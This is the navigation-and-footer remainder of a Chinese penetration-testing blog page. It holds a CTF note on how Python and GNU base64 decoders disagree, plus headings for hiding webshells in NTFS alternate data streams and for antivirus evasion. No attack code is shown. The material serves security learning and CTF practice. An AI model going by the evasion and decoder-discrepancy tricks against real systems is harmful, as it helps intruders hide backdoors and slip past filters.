ASP.NET 网站应用程式里，Session（会话数据，比如用户登录状态、购物车资料）...</div></div></div></a><a class="pagination-related" href="/2025/09/15/base64%E8%A7%A3%E7%A0%81%E5%B0%8Ftrick/" title="base64解码小trick"><img class="cover" src="/img/mygo6.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-15</div><div class="info-item-2">base64解码小trick</div></div><div class="info-2"><div class="info-item-1">N1CTF Junior 2025 2&#x2F;2 中的，也是不出意料没做出来 python 的 base64 解码逻辑和命令行的 base64 命令是不一致的 Python 的base64.b64decode(..., validate=True)在遇到 padding（=）后还有额外的 base64 字符，会报错，而用默认解码base64.b64decode(...)时，只会解出等号前的那一部分 但是命令行中会将两段都成功解出并拼接 这是因为 Base64 的编码本质上是一系列 4 字符为一组的字符块，最后一组可能用 = 填充以满足块对齐，根据解析器类型的不同，解析方法也会有区别  **严格解析器（Python 的 ****validate=True**）：一旦遇到合法的填充字符 =，就认为这是该 base64 段的结束；如果填充后仍有数据，会报错为“padding 之后有额外数据” 宽松&#x2F;流式解析器（GNU **base64 -d** 等）：通常会把整个输入当作可能包含多个 base64 段（或忽略某些格式约束），会尽量解出每一段能解的部分，因此出现“先解出第一...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">ALe</div><div class="author-info-description">从渗透测试到网安烧烤的一生</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ALe1293528"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">恐惧扼住咽喉，如枷锁禁锢我的双臂 我向沉默发问，沉默却愈发震耳欲聋</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E5%AE%BF%E4%B8%BB%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">1. 使用宿主文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%95%E7%8B%AC%E7%9A%84-ADS-%E6%95%B0%E6%8D%AE%E6%B5%81%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">2. 单独的 ADS 数据流文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E5%90%8E%E9%97%A8"><span class="toc-number">2.</span> <span class="toc-text">webshell后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%85%E6%AF%92%E5%85%8D%E6%9D%80"><span class="toc-number">4.</span> <span class="toc-text">病毒免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">5.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%89%A7%E8%A1%8C"><span class="toc-number">5.1.</span> <span class="toc-text">通过文件上传执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%89%A7%E8%A1%8C"><span class="toc-number">5.2.</span> <span class="toc-text">通过文件下载执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E9%9A%90%E8%97%8F"><span class="toc-number">5.3.</span> <span class="toc-text">进一步隐藏</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/02/05/furryCTF-2025-wp/" title="furryCTF 2025-wp"><img src="/img/tianshi1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="furryCTF 2025-wp"/></a><div class="content"><a class="title" href="/2026/02/05/furryCTF-2025-wp/" title="furryCTF 2025-wp">furryCTF 2025-wp</a><time datetime="2026-02-05T06:51:53.000Z" title="Created 2026-02-05 14:51:53">2026-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/13/ciscn2026%E5%88%9D%E8%B5%9Bwp-web/" title="ciscn2026初赛wp-web"><img src="/img/mygo3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ciscn2026初赛wp-web"/></a><div class="content"><a class="title" href="/2026/01/13/ciscn2026%E5%88%9D%E8%B5%9Bwp-web/" title="ciscn2026初赛wp-web">ciscn2026初赛wp-web</a><time datetime="2026-01-13T09:38:18.000Z" title="Created 2026-01-13 17:38:18">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/12/RASP%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E7%BB%95%E8%BF%87/" title="RASP的基础和绕过"><img src="/img/anon1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RASP的基础和绕过"/></a><div class="content"><a class="title" href="/2026/01/12/RASP%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E7%BB%95%E8%BF%87/" title="RASP的基础和绕过">RASP的基础和绕过</a><time datetime="2026-01-12T08:47:06.000Z" title="Created 2026-01-12 16:47:06">2026-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="文件解压之过（Zip Slip）漏洞导致 Python 代码执行"><img src="/img/anon2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件解压之过（Zip Slip）漏洞导致 Python 代码执行"/></a><div class="content"><a class="title" href="/2025/11/30/%E6%96%87%E4%BB%B6%E8%A7%A3%E5%8E%8B%E4%B9%8B%E8%BF%87%EF%BC%88Zip-Slip%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4-Python-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="文件解压之过（Zip Slip）漏洞导致 Python 代码执行">文件解压之过（Zip Slip）漏洞导致 Python 代码执行</a><time datetime="2025-11-30T03:58:13.000Z" title="Created 2025-11-30 11:58:13">2025-11-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改"><img src="/img/qingniao2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BehinderV4魔改"/></a><div class="content"><a class="title" href="/2025/10/30/BehinderV4%E9%AD%94%E6%94%B9/" title="BehinderV4魔改">BehinderV4魔改</a><time datetime="2025-10-30T12:38:13.000Z" title="Created 2025-10-30 20:38:13">2025-10-30</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By ALe</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>